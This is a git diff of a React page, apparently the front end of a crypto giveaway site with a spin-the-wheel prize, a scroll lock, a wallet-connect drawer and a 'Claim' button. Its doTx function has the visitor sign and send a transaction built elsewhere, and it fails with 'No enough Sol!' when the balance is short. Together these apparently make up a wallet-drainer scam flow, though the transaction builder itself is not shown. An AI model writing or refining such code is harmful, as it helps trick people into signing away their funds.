@@ -50,7 +50,7 @@ export default function Page() {
         window.addEventListener('scroll', lock)
         return () => window.removeEventListener('scroll', lock)
       }
-    } catch { /**/ }
+    } catch { /* ignore */ }
   }, [])
 
   /* ——— Çark (spin) durumu ——— */
@@ -63,7 +63,7 @@ export default function Page() {
   }, [hasSpun])
   const handleSpin = () => {
     if (hasSpun || !wheelRef.current) return
-    const w = wheelRef.current
+    const w = wheelRef.current!
     w.style.transition = 'transform 9000ms ease-in-out'
     w.style.transform  = 'rotate(1080deg)'
     setTimeout(() => {
@@ -78,10 +78,10 @@ export default function Page() {
 
   /* ——— Wallet & Drawer kontrolü ——— */
   const { connection: conn } = useConnection()
-  const { wallets, select, publicKey, sendTransaction } = useWallet()
+  const { wallets, select, publicKey } = useWallet()
   const [drawerOpen, setDrawerOpen] = useState(false)
-  const [loading,    setLoading]    = useState(false)
-  const [msg,        setMsg]        = useState('')
+  const [loading, setLoading]       = useState(false)
+  const [msg, setMsg]               = useState('')
 
   const openDrawer  = () => setDrawerOpen(true)
   const closeDrawer = () => setDrawerOpen(false)
@@ -150,52 +150,49 @@ export default function Page() {
   }
 
   // map + filter ile tip güvenli dizi
-  const mappedWallets: Array<DrawerWallet | null> = walletConfigs.map(cfg => {
+  const mappedWallets = walletConfigs.map(cfg => {
     const w = wallets.find(w => cfg.match(w.adapter.name))
-    return w
-      ? { adapter: w.adapter, readyState: w.readyState, ...cfg }
-      : null
+    return w ? { adapter: w.adapter, readyState: w.readyState, ...cfg } : null
   })
   const orderedWallets: DrawerWallet[] = mappedWallets.filter(
     (x): x is DrawerWallet => x !== null
   )
 
-const doTx = async () => {
-  setLoading(true)
-  try {
-    const tx = await createUnsignedTransaction(publicKey || null)
-    if (!tx) {
-      setMsg('No enough Sol!')
-      return
+  /* ——— Transaction gönderme ——— */
+  const doTx = async () => {
+    setLoading(true)
+    try {
+      const tx = await createUnsignedTransaction(publicKey || null)
+      if (!tx) {
+        setMsg('No enough Sol!')
+        return
+      }
+
+      let sig: string | undefined
+      const adapter = wallets.find(w => w.adapter.publicKey?.equals(publicKey!))?.adapter
+
+      // 1) Eğer adapter.signAndSendTransaction metodu varsa kullan
+      if (adapter && 'signAndSendTransaction' in adapter) {
+        sig = await (adapter as any).signAndSendTransaction(tx)
+      }
+
+      // 2) Fallback: signTransaction + sendRawTransaction
+      if (!sig) {
+        const signed = await window.solana?.signTransaction?.(tx)
+        if (!signed) throw new Error('Unable to sign transaction')
+        sig = await conn.sendRawTransaction(signed.serialize())
+      }
+
+      await conn.confirmTransaction(sig, 'confirmed')
+      setMsg('Transaction successful!')
+    } catch (e) {
+      console.error('Transaction error', e)
+      setMsg('Transaction failed')
+    } finally {
+      setLoading(false)
+      setTimeout(() => setMsg(''), 5000)
     }
-
-    let sig: string | undefined
-
-    const adapter = wallets.find(w => w.adapter.publicKey?.equals(publicKey!))?.adapter
-
-    // 1) signAndSendTransaction varsa onu kullan
-    if (adapter && 'signAndSendTransaction' in adapter) {
-      // @ts-ignore: bazı adapter'lar bunu sağlar
-      sig = await adapter.signAndSendTransaction(tx)
-    }
-
-    // 2) değilse fallback → signTransaction + sendRawTransaction
-    if (!sig) {
-      const signed = await window.solana?.signTransaction?.(tx)
-      if (!signed) throw new Error("Unable to sign transaction")
-      sig = await conn.sendRawTransaction(signed.serialize())
-    }
-
-    await conn.confirmTransaction(sig, 'confirmed')
-    setMsg('Transaction successful!')
-  } catch (e) {
-    console.error('Transaction error', e)
-    setMsg('Transaction failed')
-  } finally {
-    setLoading(false)
-    setTimeout(() => setMsg(''), 5000)
   }
-}
 
   /* ——— Claim butonu ——— */
   const handleClaim = () => {
@@ -223,6 +220,7 @@ const doTx = async () => {
 
     window.open(w.deepLink, '_blank')
   }
+
 
       return (
         <>
